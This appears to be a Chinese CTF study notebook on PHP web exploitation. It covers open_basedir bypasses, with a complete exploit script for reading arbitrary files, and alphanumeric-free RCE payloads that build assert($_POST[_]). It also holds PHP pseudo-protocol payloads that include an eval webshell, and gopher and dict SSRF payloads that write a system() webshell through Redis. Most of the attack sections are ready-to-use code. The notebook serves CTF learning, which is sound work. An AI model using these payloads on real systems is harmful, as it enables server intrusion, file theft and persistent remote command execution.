执行刚才写好的脚本
![image-20230722182428909](daydayup.assets/image-20230722182428909.png)

成功读取到flag，绕过了open_opendir的限制

因为一开始`tmplink`是一个软连接，链接`./a/b/`也就是`/vat/html/www/a/b/`所以`symlink("tmplink/../../flag","exp");`这条语句就相当于`symlink("/vat/html/www/a/b/../../flag","exp");`符合open_basedir的限制，所以`exp`这个软连接就成功建立了，然后删除软连接`tmplink`，再创建`tmplink`目录，此时语句就相当于`symlink("/vat/html/www/tmplink/../../flag","exp");`，由于这时候`tmplink`变成了一个真实存在的文件夹所以`tmplink/../../`变成了flag所在的目录即`/var/www/`，然后再通过访问符号链接文件`exp`即可直接读取到`flag`文件的内容，当然，针对`symlink()`只需要将它放入disable_function即可解决问题，所以我们需要寻求更多的方法。

### glob伪协议

glob是php自5.3.0版本起开始生效的一个用来筛选目录的伪协议，由于它在筛选目录时是不受open_basedir的制约的，所以我们可以利用它来绕过限制

```php
<?php
  $a = "glob:///var/www/";
  if ( $b = opendir($a) ) {
    while ( ($file = readdir($b)) !== false ) {
      echo "filename:".$file."\n";
    }
    closedir($b);
  }
?>
```

#### glob://伪协议

glob://协议是php5.3.0以后一种查找匹配的文件路径模式。
官方给出了一个示例用法

```php
<?php
// 循环 ext/spl/examples/ 目录里所有 *.php 文件
// 并打印文件名和文件尺寸
$it = new DirectoryIterator("glob://ext/spl/examples/*.php");
foreach($it as $f) {
    printf("%s: %.1FK\n", $f->getFilename(), $f->getSize()/1024);
}
?
```

glob://伪协议需要结合其他函数方法才能列目录，单纯传参glob://是没办法列目录的。

#### DirectoryIterator+glob://

DirectoryIterator是php5中增加的一个类，为用户提供一个简单的查看目录的接口，利用此方法可以绕过open_basedir限制。(但是似乎只能用于Linux下)
脚本差不多如下:

```php
<?php
$a = new DirectoryIterator("glob:///*");
foreach($a as $f){
    echo($f->__toString().'<br>');
}
?>
```

可以看到,成功列出目录:
![img](daydayup.assets/open_basedir_5.png)

当传入的参数为glob:///\*时会列出根目录下的文件，传入参数为glob://\*时会列出open_basedir允许目录下的文件。

#### scandir()+glob://

这是看TCTF WP里面的一种方法，最为简单明了: 代码如下:

```
<?php
var_dump(scandir('glob:///*'));
>
```

![img](daydayup.assets/open_basedir_6.png)

这种方法也只能列出根目录和open_basedir允许目录下的文件。

#### opendir()+readdir()+glob://

脚本如下:

```
<?php
if ( $b = opendir('glob:///*') ) {
    while ( ($file = readdir($b)) !== false ) {
        echo $file."<br>";
    }
    closedir($b);
}
?>
```

![img](daydayup.assets/open_basedir_7.png)

同理，这种方法也只能列出根目录和open_basedir允许目录下的文件。
可以看到，上面三种和glob://相关的协议，最大的缺陷就是只能列目录，而且还只能列根目录和open_basedir允许目录的内容。

#### ini_set()绕过

>`ini_set()`函数：
>
>ini_set()用来设置php.ini的值，在函数执行的时候生效，脚本结束后，设置失效。无需打开php.ini文件，就能修改配置。函数用法如下:
>
>```
>ini_set ( string $varname , string $newvalue ) : string
>```
>
>- varname是需要设置的值
>- newvalue是设置成为新的值
>- 成功时返回旧的值，失败时返回 FALSE。

当前我们处在/var/www/html文件夹下，对应的POC为:

```php
<?php
mkdir('Von');  //创建一个目录Von
chdir('Von');  //切换到Von目录下
ini_set('open_basedir','..');  //把open_basedir切换到上层目录
chdir('..');  //以下这三步是把目录切换到根目录
chdir('..');
chdir('..');
ini_set('open_basedir','/');  //设置open_basedir为根目录(此时相当于没有设置open_basedir)
echo file_get_contents('/etc/passwd');  //读取/etc/passwd
```

原理涉及到了PHP的底层实现，较为复杂，具体可以参考这几篇文章。

[bypass open_basedir的新方法 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/4720)

[从PHP底层看open_basedir bypass · sky's blog (skysec.top)](https://skysec.top/2019/04/12/从PHP底层看open-basedir-bypass/#poc测试)

#### 利用SplFileInfo::getRealPath()类方法绕过

`SplFileInfo`类是PHP5.1.2之后引入的一个类，提供一个对文件进行操作的接口。我们在`SplFileInfo`的构造函数中传入文件相对路径，并且调用`getRealPath()`即可获取文件的绝对路径。
这个方法有个特点：完全没有考虑open_basedir。在传入的路径为一个不存在的路径时，会返回false；在传入的路径为一个存在的路径时，会正常返回绝对路径。脚本如下:

```php
<?php
$info = new SplFileInfo('/etc/passwd');
var_dump($info->getRealPath());
?>
```

当传入的路径存在时，返回路径。

当传入的路径不存在时，返回False。

但是如果我们完全不知道路径的情况下就和暴力猜解无异了，时间花费极高。在Windows系统下可以利用`<>`来列出所需目录下的文件，有P神的POC如下:

```php
<?php
ini_set('open_basedir', dirname(__FILE__));
printf("<b>open_basedir: %s</b><br />", ini_get('open_basedir'));
$basedir = 'D:/test/';
$arr = array();
$chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
for ($i=0; $i < strlen($chars); $i++) { 
    $info = new SplFileInfo($basedir . $chars[$i] . '<><');
    $re = $info->getRealPath();
    if ($re) {
        dump($re);
    }
}
function dump($s){
    echo $s . '<br/>';
    ob_flush();
    flush();
}
?>
```

当然由于<><是Windows特有的通配符。所以该POC只能在Windows环境下使用。Linux下只能暴力破解。

>在windows中可以使用通配符“* ”、“? ”查找文件，对于相同字符开头的单词和相同字符结尾的单词可以用“<”和“ >”通配符查找单词。
>
>1. 如果要查找： 任意单个字符 ：
>     键入 ? 例如，s?t 可查找“sat”和“set”……。
>2. 任意字符串 :
>     键入 * 例如，s*d 可查找“sad”和“started”……。
>3. 单词的开头
>     键入 < 例如，<(inter) 查找“interesting”和“intercept”……，但不查找“splintered”。
>4. 单词的结尾
>     键入 > 例如，(in)> 查找“in”和“within”……，但不查找“interesting”
>
>linux通配符
>
>![img](daydayup.assets/v2-8ad24c5e1b91a5741444e98851b94b01_r.jpg)

#### realpath()绕过

`realpath()`函数和`SplFileInfo::getRealPath()`作用类似。同样是可以得到绝对路径。函数定义如下:

```
realpath ( string $path ) : string
```

当我们传入的路径是一个不存在的文件（目录）时，它将返回false；当我们传入一个不在open_basedir里的文件（目录）时，他将抛出错误（File is not within the allowed path(s)）。 

所以我们可以通过这个特点，来进行目录的猜解。举个例子，我们需要猜解根目录（不在open_basedir中）下的所有文件，只用写一个捕捉php错误的函数`err_handle()`。当猜解某个存在的文件时，会因抛出错误而进入`err_handle()`，当猜解某个不存在的文件时，将不会进入`err_handle()`。

同样，对于这个函数，我们在Windows下仍然能够使用通配符<>来列目录，有P神的脚本如下:

```php
<?php
ini_set('open_basedir', dirname(__FILE__));
printf("<b>open_basedir: %s</b><br />", ini_get('open_basedir'));
set_error_handler('isexists');
$dir = 'd:/test/';
$file = '';
$chars = 'abcdefghijklmnopqrstuvwxyz0123456789_';
for ($i=0; $i < strlen($chars); $i++) { 
    $file = $dir . $chars[$i] . '<><';
    realpath($file);
}
function isexists($errno, $errstr)
{
    $regexp = '/File\((.*)\) is not within/';
    preg_match($regexp, $errstr, $matches);
    if (isset($matches[1])) {
        printf("%s <br/>", $matches[1]);
    }
}
?>
```

`realpath()`和`SplFileInfo::getRealPath()`的区别在于，`realpath()`只有在启用了open_basedir()限制的情况下才能使用这种思路爆目录，而`SplFileInfo::getRealPath()`可以无视是否开启open_basedir进行列目录(当然，没有开启open_basedir也没必要花这么大的功夫来列目录了)

#### imageftbbox()绕过

GD库imageftbbox/imagefttext列举目录

GD库一般是PHP必备的扩展库之一，当中的`imageftbbox()`函数也可以起到像`realpath()`一样的列目录效果。
其思想也和open_basedir类似。这个函数第三个参数是字体的路径。我发现当这个参数在open_basedir外的时候，当文件存在，则php会抛出“File(xxxxx) is not within the allowed path(s)”错误。但当文件不存在的时候会抛出“Invalid font filename”错误。 也就是说，我们可以通过抛出错误的具体内容来判断一个文件是否存在。这个方法和realpath有相似性，都会抛出open_basedir的错误。

有POC如下:

```php
<?php
ini_set('open_basedir', dirname(__FILE__));
printf("<b>open_basedir: %s</b><br />", ini_get('open_basedir'));
set_error_handler('isexists');
$dir = 'd:/test/';
$file = '';
$chars = 'abcdefghijklmnopqrstuvwxyz0123456789_';
for ($i=0; $i < strlen($chars); $i++) { 
    $file = $dir . $chars[$i] . '<><';
    //$m = imagecreatefrompng("zip.png");
    //imagefttext($m, 100, 0, 10, 20, 0xffffff, $file, 'aaa');
    imageftbbox(100, 100, $file, 'aaa');
}
function isexists($errno, $errstr)
{
    global $file;
    if (stripos($errstr, 'Invalid font filename') === FALSE) {
        printf("%s<br/>", $file);
    }
}
?>
```

这个方法报错的时候并不会把真正的路径爆出来，这也是其与realpath的最大不同之处，用这种方法只能一位一位猜解列目录

而且和上面的两种方法类似，由于都使用了Windows的通配符，所以这些POC都只能在Windows下使用，Linux下只能暴力猜解。

#### bindtextdomain()绕过

bindtextdomain是php下绑定domain到某个目录的函数。用法如下:

```
bindtextdomain ( string $domain , string $directory ) : string
```

`bindtextdomain`是php下绑定domain到某个目录的函数。具体这个domain是什么我也没具体用过，只是在一些l10n应用中可能用到的方法（相关函数textdomain、gettext、setlocale，说明：http://php.net/manual/en/function.gettext.php）

所以第一个参数随便传都行，主要出在第二个参数上，当第二个参数即目录存在时，会返回目录的路径，当目录不存在时，会返回False。故有脚本如下:

```php
<?php
printf('<b>open_basedir: %s</b><br />', ini_get('open_basedir'));
$re = bindtextdomain('xxx', $_GET['dir']);
var_dump($re);
?>
```

我们也可以通过返回值的不同来猜解、列举某个目录。

但很大的鸡肋点在，windows下默认是没有这个函数的，而在linux下不能使用通配符进行目录的猜解，所以显得很鸡肋。

当然，在万无退路的时候进行暴力猜解目录，也不失为一个还算行的方法。

### EXP

[php5全版本绕过open_basedir读文件脚本 | 离别歌 (leavesongs.com)](https://www.leavesongs.com/other/bypass-open-basedir-readfile.html)

```php
<?php
/*
* by phithon
* From https://www.leavesongs.com
* detail: http://cxsecurity.com/issue/WLB-2009110068
*/
header('content-type: text/plain');
error_reporting(-1);
ini_set('display_errors', TRUE);
printf("open_basedir: %s\nphp_version: %s\n", ini_get('open_basedir'), phpversion());
printf("disable_functions: %s\n", ini_get('disable_functions'));
$file = str_replace('\\', '/', isset($_REQUEST['file']) ? $_REQUEST['file'] : '/etc/passwd');
$relat_file = getRelativePath(__FILE__, $file);
$paths = explode('/', $file);
$name = mt_rand() % 999;
$exp = getRandStr();
mkdir($name);
chdir($name);
for($i = 1 ; $i < count($paths) - 1 ; $i++){
    mkdir($paths[$i]);
    chdir($paths[$i]);
}
mkdir($paths[$i]);
for ($i -= 1; $i > 0; $i--) { 
    chdir('..');
}
$paths = explode('/', $relat_file);
$j = 0;
for ($i = 0; $paths[$i] == '..'; $i++) { 
    mkdir($name);
    chdir($name);
    $j++;
}
for ($i = 0; $i <= $j; $i++) { 
    chdir('..');
}
$tmp = array_fill(0, $j + 1, $name);
symlink(implode('/', $tmp), 'tmplink');
$tmp = array_fill(0, $j, '..');
symlink('tmplink/' . implode('/', $tmp) . $file, $exp);
unlink('tmplink');
mkdir('tmplink');
delfile($name);
$exp = dirname($_SERVER['SCRIPT_NAME']) . "/{$exp}";
$exp = "http://{$_SERVER['SERVER_NAME']}{$exp}";
echo "\n-----------------content---------------\n\n";
echo file_get_contents($exp);
delfile('tmplink');

function getRelativePath($from, $to) {
  // some compatibility fixes for Windows paths
  $from = rtrim($from, '\/') . '/';
  $from = str_replace('\\', '/', $from);
  $to   = str_replace('\\', '/', $to);

  $from   = explode('/', $from);
  $to     = explode('/', $to);
  $relPath  = $to;

  foreach($from as $depth => $dir) {
    // find first non-matching dir
    if($dir === $to[$depth]) {
      // ignore this directory
      array_shift($relPath);
    } else {
      // get number of remaining dirs to $from
      $remaining = count($from) - $depth;
      if($remaining > 1) {
        // add traversals up to first matching dir
        $padLength = (count($relPath) + $remaining - 1) * -1;
        $relPath = array_pad($relPath, $padLength, '..');
        break;
      } else {
        $relPath[0] = './' . $relPath[0];
      }
    }
  }
  return implode('/', $relPath);
}

function delfile($deldir){
    if (@is_file($deldir)) {
        @chmod($deldir,0777);
        return @unlink($deldir);
    }else if(@is_dir($deldir)){
        if(($mydir = @opendir($deldir)) == NULL) return false;
        while(false !== ($file = @readdir($mydir)))
        {
            $name = File_Str($deldir.'/'.$file);
            if(($file!='.') && ($file!='..')){delfile($name);}
        } 
        @closedir($mydir);
        @chmod($deldir,0777);
        return @rmdir($deldir) ? true : false;
    }
}

function File_Str($string)
{
    return str_replace('//','/',str_replace('\\','/',$string));
}

function getRandStr($length = 6) {
    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $randStr = '';
    for ($i = 0; $i < $length; $i++) {
        $randStr .= substr($chars, mt_rand(0, strlen($chars) - 1), 1);
    }
    return $randStr;
}
```

如我们欲读取`/etc/passwd`。其实原理就是创建一个链接文件`x`，用相对路径指向`a/a/a/a`，再创建一个链接文件exp指向`x/../../../etc/passwd`。其实指向的就是`a/a/a/a/../../../etc/passwd`，其实就是`./etc/passwd`。这时候删除`x`，再创建一个`x`目录，但exp还是指向`x/../../../etc/passwd`，所以就成功跨到`/etc/passwd`了。 

精华就是这四句： 

```
<?php
symlink("abc/abc/abc/abc","tmplink"); 
symlink("tmplink/../../../etc/passwd", "exploit"); 
unlink("tmplink"); 
mkdir("tmplink");
```

我们访问 http://xxx/exp ，如果服务器支持链接文件的访问，那么就能读到`/etc/passwd`。 

其中并没有任何操作触发open_basedir，但达到的效果就是绕过了open_basedir读取任意文件。错误不在php，但又不知道把错误归结到谁头上，所以php一直未管这个问题。 

## 无数字字母RCE

### 异或

数字相同异或为0，不相同为1.

0^1=1

0^0=0

1^1=0

![img](daydayup.assets/2541080-20211013201309359-145776079.png)

枚举字符脚本

```python
from operator import xor


def hex_generator():
    """
    生成所有两位十六进制数。
    """
    for i in range(16):
        for j in range(16):
            _bytes = bytes.fromhex(f"{i:x}{j:x}")

            yield _bytes


yi_list = ['a', 'b', '_']
result = {}
# 遍历所有两位十六进制数
for hex_string1 in hex_generator():
    for hex_string2 in hex_generator():
        yi = b''
        for b1, b2 in zip(hex_string1, hex_string2):
            yi += bytes([b1 ^ b2])
            try:
                if yi.decode() in yi_list:
                    if yi.decode() in result.keys():
                        result[yi.decode()].append(str(hex_string1) + ' ^ ' + str(hex_string2))
                    else:
                        result.update({
                            yi.decode(): [str(hex_string1) + ' ^ ' + str(hex_string2)]
                        })
            except:
                pass

for key, values in result.items():
    print(key)
    for value in values:
        print(key + "\t" + value)

```

![image-20240417162133264](daydayup.assets/image-20240417162133264.png)

![image-20240417162253044](daydayup.assets/image-20240417162253044.png)

### 取反

>（12）10=（1100）2
>对，是把得出余数的先后顺序反过来
>32位表示二进制的12：
>0000 0000 0000 0000 0000 0000 0000 1100
>取反结果：
>1111 1111 1111 1111 1111 1111 1111 0011
>观察取反后的结果：从左向右看，第一位0正1符
>-111 1111 1111 1111 1111 1111 1111 0011
>负数是用补码表示的，补码是原码取反+1，也就是说
>111 1111 1111 1111 1111 1111 1111 0011是某个数取反+1得到的。反过来，也就是
>111 1111 1111 1111 1111 1111 1111 0011先-1，结果是
>111 1111 1111 1111 1111 1111 1111 0010，再取反是
>000 0000 0000 0000 0000 0000 0000 1101
>1101就是：1\*2的三次方+1\*2的二次方+0\*2的一次方+1\*2的零次方
>即1101就是:8+4+1=13，别忘了前边的负号，最终结果-13
>原文链接：https://blog.csdn.net/WilliamsWayne/article/details/78259501

![img](daydayup.assets/2541080-20211013201511542-689493594.png)

可以看到，`assert`的取反结果是`%9E%8C%8C%9A%8D%8B`，`_POST`的取反结果是`%A0%AF%B0%AC%AB`，那我们就开始构造：

```php
$_=~(%9E%8C%8C%9A%8D%8B);    //这里利用取反符号把它取回来，$_=assert
$__=~(%A0%AF%B0%AC%AB);      //$__=_POST
$___=$$__;                   //$___=$_POST
$_($___[_]);                 //assert($_POST[_]);
放到一排就是：
$_=~(%9E%8C%8C%9A%8D%8B);$__=~(%A0%AF%B0%AC%AB);$___=$$__;$_($___[_]);
```

或者利用的是UTF-8编码的某个汉字，并将其中某个字符取出来，然后再进行一次取反操作，就能得到一个我们想要的字符

![image-20240417163000962](daydayup.assets/image-20240417163000962.png)

![image-20240417163137987](daydayup.assets/image-20240417163137987.png)

```php
$_++;                //得到1，此时$_=1
$__ = "极";
$___ = ~($__{$_});   //得到a，此时$___="a"
$__ = "区";
$___ .= ~($__{$_});   //得到s，此时$___="as"
$___ .= ~($__{$_});   //此时$___="ass"
$__ = "皮";
$___ .= ~($__{$_});   //得到e，此时$___="asse"
$__ = "十";
$___ .= ~($__{$_});   //得到r，此时$___="asser"
$__ = "勺";
$___ .= ~($__{$_});   //得到t，此时$___="assert"
$____ = '_';          //$____='_'
$__ = "寸";
$____ .= ~($__{$_});   //得到P，此时$____="_P"
$__ = "小";
$____ .= ~($__{$_});   //得到O，此时$____="_PO"
$__ = "欠";
$____ .= ~($__{$_});   //得到S，此时$____="_POS"
$__ = "立";
$____ .= ~($__{$_});   //得到T，此时$____="_POST"
$_ = $$____;           //$_ = $_POST
$___($_[_]);           //assert($_POST[_])
放到一排就是：
$_++;$__ = "极";$___ = ~($__{$_});$__ = "区";$___ .= ~($__{$_});$___ .= ~($__{$_});$__ = "皮";$___ .= ~($__{$_});$__ = "十";$___ .= ~($__{$_});$__ = "勺";$___ .= ~($__{$_});$____ = '_';$__ = "寸";$____ .= ~($__{$_});$__ = "小";$____ .= ~($__{$_});$__ = "欠";$____ .= ~($__{$_});$__ = "立";$____ .= ~($__{$_});$_ = $$____;$___($_[_]);
```

[无字母数字RCE的一些总结 - xiaofeiji's Blog (xiaofeiji-77.github.io)](https://xiaofeiji-77.github.io/2021/08/22/无字母数字RCE的一些总结/)

## PHP WebShell免杀



## 非常见协议

[SecMap - 非常见协议大礼包 - Tr0y's Blog](https://www.tr0y.wang/2021/05/17/SecMap-非常见协议大礼包/#data)

![20210517104415](daydayup.assets/20210517104415.png)



####  file://

读取本地文件，浏览器读取本地文件的时候，用的也是这个协议

####  data://

[文件包含漏洞之PHP伪协议中的data://的那些事~_Firebasky的博客-CSDN博客](https://blog.csdn.net/qq_46091464/article/details/106665358)

条件：

- `allow_url_include`: `On`
- PHP >= 5.2.0

格式：

`data:[<mediatype>][;base64],<data>`

- `<mediatype>`：可选，指定数据的媒体类型（MIME 类型），例如 `text/plain`、`image/jpeg` 等。这部分内容可以省略。
- `;base64`：可选，表示数据采用 Base64 编码。如果提供了 `;base64`，那么数据部分应该是经过 Base64 编码的。
- `<data>`：实际的数据内容。

```
?file=data://text/plain,<?php phpinfo();?>
?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2B
?file=data://text/plain;base64,PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8%2B
```

该协议类似于 php://input，区别在于 data:// 是直接获取后面跟着的内容。浏览器一般都支持这个协议，最常用的莫过于展示小图片了；在 CTF 中常用于执行任意 PHP 代码。

每个组件支持的会稍微有点区别，例如 `data:;,<?php phpinfo();?>` 在 Chrome 可以，但是在 PHP 不行

####  dict://

dict 协议是一个字典服务器协议，就是用来查单词的那种字典。字典服务器本来是为了让客户端使用过程中能够访问更多的字典源。

dict 协议的格式：`dict://`+`ip:端口`+`/` + `TCP/IP 数据`

与 gopher 相比，dict 携带的数据无法插入 `\r\n`（只能插入 `\\r\\n`），所以对于大部分组件来说，只能执行一条命令，所以如果一个组件可以一步一步操作（比如 redis），那么才可以利用，那么很明显，需要认证的 redis 是无法通过 dict 攻击的（即使你知道密码也没用），但是可以用来爆破密码。

####  php://

访问各个输入/输出流（I/O streams）。PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符；内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。

属于 PHP 中的伪协议，受限于 php.ini 中的配置

#####  php://input

作用：访问请求的原始数据的只读流

条件：

- `allow_url_include`: `On`

- form 表单里的 enctype 不为 `multipart/form-data`（默认为 `application/x-www-form-urlencoded`）。体现在请求头里就是 Content-Type 不能为 `multipart/form-data`（文件上传）

  > Multipart 允许客户端在一次 HTTP 请求中发送多个部分（part）数据，每部分数据之间的类型可以不同。

PHP 在遇到这个伪协议的时候，会读取 POST 的数据当做内容。

比如 readfile、file_get_contents、include，都支持此伪协议。在 CTF 中常用于执行任意 PHP 代码。

#####  php://filter

作用：用于数据流打开时，对数据进行筛选、过滤。

条件：无

格式：`php://filter/[0]=[1]/resource=[2]`

其中：

- `[0]`: 可选 read/write
- `[1]`: 就是过滤器，可以设定一个或多个过滤器名称，以管道符（`|`）分隔即可。比如：`convert`、`string`，更多可参考官方文档：https://www.php.net/manual/zh/filters.php
- `[2]`: 必选的值，为要筛选过滤的数据流，通常是本地文件的路径，绝对路径和相对路径均可以使用。

示例：`php://filter/read=convert.base64-encode/resource=flag.php`

表示读取本地文件 flag.php，并进行 base64 编码。

在 CTF 中常用于读取 PHP 的源码。

```
php://filter 读取服务器中文件，并且在读的过程中会对数据进行编码

php://filter/read=convert.base64-encode/resource=要读的文件名

php://filter/convert.base64-encode/resource=要读的文件名

php://filter/string.rot13/resource=要读的文件名

file=php://filter/convert.iconv.utf-8.utf-7/resource=flag.php
iconv.从这个编码.转换到这个编码
```

>iconv ( string $in_charset , string $out_charset , string $str ) : 
>string将字符串 str 从 in_charset 转换编码到 out_charset。
>in_charset：输入的字符集。
>out_charset：输出的字符集。
>
>```php
><?php
>echo iconv("UCS-2LE","UCS-2BE",'<?php @eval($_POST[hack]);?>');
>?>
>//?<hp pe@av(l_$OPTSh[ca]k;)>?
>```

####  phar://

- 作用：属于 PHP 伪协议，phar（PHP Archive) 是 PHP 里类似于 JAR 的一种打包文件。
- 条件：
  - PHP >= 5.3.0

phar:// 的利用场景示例：

```php
<?php
  $files = $_GET['file'];
  include($files);
?>
```

对于这样的例子，先上传一个 zip 压缩包，里面是一个 txt 文件，内容是：`<?php phpinfo(); ?>`，在知道绝对路径（/www/upload/test.zip）之后，可以利用 phar:// 来执行这段代码，payload: `phar:///www/upload/test.zip/test.txt`

####  zip://

- 作用：属于 PHP 伪协议，用于访问 zip 压缩流

格式：`zip://[压缩文件绝对路径]#[压缩文件内的路径以及文件名]`

## SSRF和Gopher

<u>*awctf --- i_am_eeeeeshili*</u>

<u>*buuctf --- [De1CTF 2019]SSRF Me*</u>

### curl命令行工具

GET请求

```
curl http://127.0.0.1
```

POST请求

```
curl -x POST -d "a=1" http://127.
```

携带Cookie

```
curl -cookie "Cookie=xxx" http://xxx
```

上传文件

```
curl -F "file=@/etc/passwd" http://127.0.0.1
```

### SSRF中主要的协议

1. file协议

   file协议主要用于访问本地计算机中的文件，命令格式为：

   ```
   file://文件绝对路径
   ```

   ![image-20230716012047466](daydayup.assets/image-20230716012047466.png)

2. Gopher协议

   https://github.com/tarunkant/Gopherus

   [Gopher协议_0ak1ey的博客-CSDN博客](https://blog.csdn.net/qq_43665434/article/details/115255263)

   ```
   URL:gopher://<host>:<port>/<gopher-path>_后接TCP数据流
   
   gopher的默认端口是70
   如果发起post请求，回车换行需要使用%0d%0a，如果多个参数，参数之间的&也需要进行URL编码
   ```

3. dict协议

   词典网络协议

   [SSRF漏洞中使用到的其他协议_0ak1ey的博客-CSDN博客](https://blog.csdn.net/qq_43665434/article/details/115434528)

   ```
   dict://ip:port/后接TCP/IP数据量
   
   向服务器的端口请求为【命令:参数】，并在末尾自动补上\r\n(CRLF)，为漏洞利用增加了便利
   dict协议执行命令要一条一条执行
   ```

### SSRF打redis

<u>*CTFhub --- web-ssrf-redis*</u>

#### Gopher

![img](daydayup.assets/1689445890678-9ea0f307-73ec-46e3-ae86-8755a0807333.png)

```c
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0Agopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A
```

payload需要再进行一次url编码

![img](daydayup.assets/1689445973347-88b9dac1-ab6c-4188-9720-47a580066a91.png)

![img](daydayup.assets/1689445992524-f1c3229a-1074-4b13-9fab-6b3a0573a1dd.png)

#### dict

![img](daydayup.assets/1689447145441-17d16e46-64e7-47b2-816d-01835b4399c2.png)

>```
>str="<?php system($_GET[\"a\"])?>";
>len=str.length;
>arr=[];
>for(var i=0;i<len;i++){
>	arr.push(str.charCodeAt(i).toString(16));
>}
>console.log("\\x"+arr.join("\\x"));
>```

```c
更改rdb文件的目录至网站目录下
url=dict://127.0.0.1:6379/config:set:dir:/var/www/html

将rdb文件名dbfilename改为webshell的名字
url=dict://127.0.0.1:6379/config:set:dbfilename:webshell.php

写入webshell，有些时候可能\x需要换成 \\x进行转义
url=dict://127.0.0.1:6379/set:webshell:"\x3c\x3f\x70\x68\x70\x20\x73\x79\x73\x74\x65\x6d\x28\x24\x5f\x47\x45\x54\x5b\x22\x63\x6d\x64\x22\x5d\x29\x3f\x3e"

进行备份
dict://127.0.0.1:6379/save更改rdb文件的目录至网站目录下
url=dict://127.0.0.1:6379/config:set:dir:/var/www/html
```

![img](daydayup.assets/1689447203355-71caa4c3-6179-4e48-a9e3-18b68673f4c8.png)

### SSRF打FastCGI

>`auto_prepend_file`是告诉PHP，在执行目标文件之前，先包含`auto_prepend_file`中指定的文件；`auto_append_file`是告诉PHP，在执行完成目标文件后，包含`auto_append_file`指向的文件。

<u>*CTFhub --- web-ssrf-FastCGI*</u>

[NCTF2019\]phar matches everything（自动化脚本获取flag）_buuctf phar_Ho1aAs的博客-CSDN博客](https://blog.csdn.net/Xxy605/article/details/120161001)

[fastCGI](https://www.cnblogs.com/tssc/p/10255590.html)

[Fastcgi协议分析 && PHP-FPM未授权访问漏洞 && Exp编写_mysteryflower的博客-CSDN博客](https://blog.csdn.net/mysteryflower/article/details/94386461)

[ fastcgi协议分析与实例_Shreck66的博客-CSDN博客](https://blog.csdn.net/shreck66/article/details/50355729)

[利用SSRF攻击内网FastCGI协议 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/263342.html)

![image-20230715203751325](daydayup.assets/image-20230715203751325.png)

https://blog.csdn.net/mysteryflower/article/details/94386461

Fastcgi其实是一个通信协议，和HTTP协议一样，都是进行数据交换的一个通道。

类比HTTP协议来说，fastcgi协议则是服务器中间件和某个语言后端进行数据交换的协议。Fastcgi协议由多个record组成，record也有header和body一说，服务器中间件将这二者按照fastcgi的规则封装好发送给语言后端，语言后端解码以后拿到具体数据，进行指定操作，并将结果再按照该协议封装好后返回给服务器中间件。

#### 消息头(请求头)

和HTTP头不同，record的头固定8个字节，body是由头中的contentLength指定，其结构如下：

```c
typedef struct {
    /* Header */
    unsigned char version; // 版本
    unsigned char type; // 本次record的类型
    unsigned char requestIdB1; // 本次record对应的请求id
    unsigned char requestIdB0;
    unsigned char contentLengthB1; // body体的大小
    unsigned char contentLengthB0;
    unsigned char paddingLength; // 额外块大小
    unsigned char reserved; 

    /* Body */
    unsigned char contentData[contentLength];
    unsigned char paddingData[paddingLength];
} FCGI_Record;
```

头由8个uchar类型的变量组成，每个变量1字节。其中，requestId占两个字节，一个唯一的标志id，以避免多个请求之间的影响；contentLength占两个字节，表示body的大小。

语言端解析了fastcgi头以后，拿到contentLength，然后再在TCP流里读取大小等于contentLength的数据，这就是body体。

Body后面还有一段额外的数据（Padding），其长度由头中的paddingLength指定，起保留作用。不需要该Padding的时候，将其长度设置为0即可。

可见，一个fastcgi record结构最大支持的body大小是2^16，也就是65536字节。

type就是指定该record的作用。因为fastcgi一个record的大小是有限的，作用也是单一的，所以我们需要在一个TCP流里传输多个record。通过type来标志每个record的作用，用requestId作为同一次请求的id。

也就是说，每次请求，会有多个record，他们的requestId是相同的。

借用[该文章](https://blog.csdn.net/shreck66/article/details/50355729)中的一个表格，列出最主要的几种type：

![img](daydayup.assets/1689422306195-674d037d-fdee-4e2b-aad9-25c4642fd954.png)



下图为php-fpm给web服务器传输的一个具体消息的消息头(8字节)内容![img](daydayup.assets/1689422757350-d1d8efd7-1c1c-4831-a5b3-d39fc7e10e8a.png)

1. 序列0(对应version字段)的数值为01，代表php-fpm的版本信息
2. 序列1(对应type字段)的数值为03，根据上面对type值含义的解释，可以知道这个消息将标志这此次交互的结束
3. 序列2,3 00,01说明此次交互的请求ID为01
4. 序列4,5 00,08标示这在序列7之后的消息体的长度为8
5. 序列6标示填充字节为0，及本身消息体以是8的字节了
6. 序列7将消息的保留字节设为0

#### 消息体(请求体)

##### type为1

读者对照上面介绍的type值的含义可知，此类消息为交互刚开始所发的第一个消息，其消息体结构c定义如下

```c
typedef struct 
{
    unsigned char roleB1;       //web服务器所期望php-fpm扮演的角色，具体取值下面有
    unsigned char roleB0;
    unsigned char flags;        //确定php-fpm处理完一次请求之后是否关闭
